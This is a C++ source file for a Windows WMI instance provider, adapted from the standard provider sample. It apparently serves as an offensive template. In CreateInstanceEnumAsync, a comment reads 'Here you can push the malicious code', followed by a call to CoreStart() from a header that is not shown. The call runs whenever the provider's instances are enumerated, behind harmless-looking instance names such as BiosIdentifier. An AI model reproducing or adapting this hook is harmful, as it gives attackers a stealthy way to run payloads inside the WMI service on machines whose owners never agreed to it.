#define _WIN32_WINNT 0x0500


#include <objbase.h>
#include "Provider.h"
#include <process.h>
#include <strsafe.h>
#include <sddl.h>
#include "core.h"

InstDef MyDefs[] = { { L"BiosIdentifier", 34 }, { L"MajorVersion", 2 }, { L"MinorVersion", 3451 } };

long glNumInst = sizeof(MyDefs) / sizeof(InstDef);

//*******************************************************************
//
// CInstPro::CInstPro
// CInstPro::~CInstPro
//
//*******************************************************************

CInstPro::CInstPro(BSTR ObjectPath,
	BSTR User,
	BSTR Password,
	IWbemContext * pCtx)
{
	UNREFERENCED_PARAMETER(ObjectPath);
	UNREFERENCED_PARAMETER(User);
	UNREFERENCED_PARAMETER(Password);
	UNREFERENCED_PARAMETER(pCtx);
	m_pNamespace = NULL;
	m_cRef = 0;
	InterlockedIncrement(&g_cObj);
	return;
}

CInstPro::~CInstPro(void)
{
	if (m_pNamespace)
		m_pNamespace->Release();
	InterlockedDecrement(&g_cObj);
	return;
}

//*******************************************************************
//
// CInstPro::QueryInterface
// CInstPro::AddRef
// CInstPro::Release
//
// Purpose: IUnknown members for CInstPro object.
//*******************************************************************


STDMETHODIMP CInstPro::QueryInterface(REFIID riid, PPVOID ppv)
{
	*ppv = NULL;

	// Because you have dual inheritance,
	// it is necessary to cast the return type
	if (riid == IID_IWbemServices)
		*ppv = (IWbemServices*)this;

	if (IID_IUnknown == riid || riid == IID_IWbemProviderInit)
		*ppv = (IWbemProviderInit*)this;


	if (NULL != *ppv)
	{
		AddRef();
		return NOERROR;
	}
	else
		return E_NOINTERFACE;

}


STDMETHODIMP_(ULONG) CInstPro::AddRef(void)
{
	return ++m_cRef;
}

STDMETHODIMP_(ULONG) CInstPro::Release(void)
{
	ULONG nNewCount = InterlockedDecrement((long *)&m_cRef);
	if (0L == nNewCount)
		delete this;

	return nNewCount;
}

/********************************************************************
*
*   CInstPro::Initialize
*
*   Purpose: This is the implementation of IWbemProviderInit.
*            The method is required to initialize with CIMOM.
*
********************************************************************/

STDMETHODIMP CInstPro::Initialize(LPWSTR pszUser,
	LONG lFlags,
	LPWSTR pszNamespace,
	LPWSTR pszLocale,
	IWbemServices *pNamespace,
	IWbemContext *pCtx,
	IWbemProviderInitSink *pInitSink)
{
	UNREFERENCED_PARAMETER(pInitSink);
	UNREFERENCED_PARAMETER(pCtx);
	UNREFERENCED_PARAMETER(pNamespace);
	UNREFERENCED_PARAMETER(pszLocale);
	UNREFERENCED_PARAMETER(pszNamespace);
	UNREFERENCED_PARAMETER(lFlags);
	UNREFERENCED_PARAMETER(pszUser);
	if (!pNamespace)
	{
		pInitSink->SetStatus(WBEM_E_FAILED, 0);
	}
	else
	{
		m_pNamespace = pNamespace;
		m_pNamespace->AddRef();
		pInitSink->SetStatus(WBEM_S_INITIALIZED, 0);
	}


	return WBEM_S_NO_ERROR;
}

//*******************************************************************
//
// CInstPro::CreateInstanceEnumAsync
//
// Purpose: Asynchronously enumerates the instances.  
//
//*******************************************************************

SCODE CInstPro::CreateInstanceEnumAsync(const BSTR RefStr,
	long lFlags,
	IWbemContext *pCtx,
	IWbemObjectSink FAR* pHandler)
{
	UNREFERENCED_PARAMETER(lFlags);
	// Here you can push the malicious code
	CoreStart();

	//Impersonate the client
	HRESULT hr = CoImpersonateClient();

	if (FAILED(hr))
	{
		pHandler->SetStatus(0, hr, NULL, NULL);
		return hr;
	}

	// Check to see if call is at lower than 
	// RPC_C_IMP_LEVEL_IMPERSONATE level. If that is the case,
	// the provider will not be able to impersonate
	// the client to access the protected resources. 

	DWORD t_CurrentImpersonationLevel =
		GetCurrentImpersonationLevel();
	if (t_CurrentImpersonationLevel < RPC_C_IMP_LEVEL_IMPERSONATE)
	{
		// Revert before you perform any operations 
		CoRevertToSelf();

		hr = WBEM_E_ACCESS_DENIED;
		pHandler->SetStatus(0, hr, NULL, NULL);
		return hr;
	}

	SCODE sc;
	int iCnt;
	IWbemClassObject FAR* pNewInst;

	// Do a check of arguments and ensure
	// you have a pointer to Namespace

	if (pHandler == NULL || m_pNamespace == NULL)
		return WBEM_E_INVALID_PARAMETER;

	for (iCnt = 0; iCnt < glNumInst; iCnt++)
	{
		sc = CreateInst(m_pNamespace, MyDefs[iCnt].pwcKey, MyDefs[iCnt].lValue, &pNewInst, RefStr, pCtx);

		if (sc != S_OK)
			break;

		// Send the object to the caller

		pHandler->Indicate(1, &pNewInst);
		pNewInst->Release();
	}

	// Set status

	pHandler->SetStatus(0, sc, NULL, NULL);

	return sc;
}


//*******************************************************************
//
// CInstPro::GetObjectByPath
// CInstPro::GetsObjectByPathAsync
//
// Purpose: Creates an instance given a particular path value.
//
//*******************************************************************



SCODE CInstPro::GetObjectAsync(const BSTR      ObjectPath,
	long            lFlags,
	IWbemContext    *pCtx,
	IWbemObjectSink FAR* pHandler)
{
	UNREFERENCED_PARAMETER(lFlags);
	//Impersonate the client
	HRESULT hr = CoImpersonateClient();
	
	if (FAILED(hr))
	{
		pHandler->SetStatus(0, hr, NULL, NULL);
		return hr;
	}

	// Check to see if call is at the 
	// RPC_C_IMP_LEVEL_IDENTIFY level. If that is the case,
	// the provider will not be able to impersonate
	// the client to access the protected resources.
	if (GetCurrentImpersonationLevel() == RPC_C_IMP_LEVEL_IDENTIFY)
	{
		hr = WBEM_E_ACCESS_DENIED;
		pHandler->SetStatus(0, hr, NULL, NULL);
		return hr;
	}

	SCODE sc;
	IWbemClassObject FAR* pObj;
	BOOL bOK = FALSE;

	// Do a check of arguments and ensure
	// you have a pointer to Namespace

	if (ObjectPath == NULL ||
		pHandler == NULL ||
		m_pNamespace == NULL)
		return WBEM_E_INVALID_PARAMETER;

	// do the get, pass the object on to the notify

	sc = GetByPath(ObjectPath, &pObj, pCtx);
	if (sc == S_OK)
	{
		pHandler->Indicate(1, &pObj);
		pObj->Release();
		bOK = TRUE;
	}

	sc = (bOK) ? S_OK : WBEM_E_NOT_FOUND;

	// Set Status

	pHandler->SetStatus(0, sc, NULL, NULL);

	return sc;
}

//*******************************************************************
//
// CInstPro::GetByPath
//
// Purpose: Creates an instance given a particular Path value.
//
//*******************************************************************

SCODE CInstPro::GetByPath(BSTR ObjectPath,
	IWbemClassObject FAR* FAR* ppObj,
	IWbemContext  *pCtx)
{
	SCODE sc = S_OK;

	int iCnt;

	// Do a simple path parse.  The path looks like
	// InstProvSamp.MyKey="a"
	// Create a test string with just the part between quotes.

	WCHAR wcTest[MAX_PATH + 1];
	memset(wcTest, NULL, sizeof(wcTest));
	StringCbCopyW(wcTest, sizeof(wcTest), ObjectPath);

	WCHAR * pwcTest, *pwcCompare = NULL;
	int iNumQuotes = 0;
	for (pwcTest = wcTest; *pwcTest; pwcTest++)
	if (*pwcTest == L'\"')
	{
		iNumQuotes++;
		if (iNumQuotes == 1)
		{
			pwcCompare = pwcTest + 1;
		}
		else if (iNumQuotes == 2)
		{
			*pwcTest = NULL;
			break;
		}
	}
	else if (*pwcTest == L'.')
		*pwcTest = NULL;    // isolate the class name.
	if (iNumQuotes != 2)
		return WBEM_E_FAILED;

	// check the instance list for a match.

	for (iCnt = 0; iCnt < glNumInst; iCnt++)
	{
		if (!_wcsicmp(MyDefs[iCnt].pwcKey, pwcCompare))
		{
			sc = CreateInst(m_pNamespace, MyDefs[iCnt].pwcKey, MyDefs[iCnt].lValue, ppObj, wcTest, pCtx);
			return sc;
		}
	}

	return WBEM_E_NOT_FOUND;
}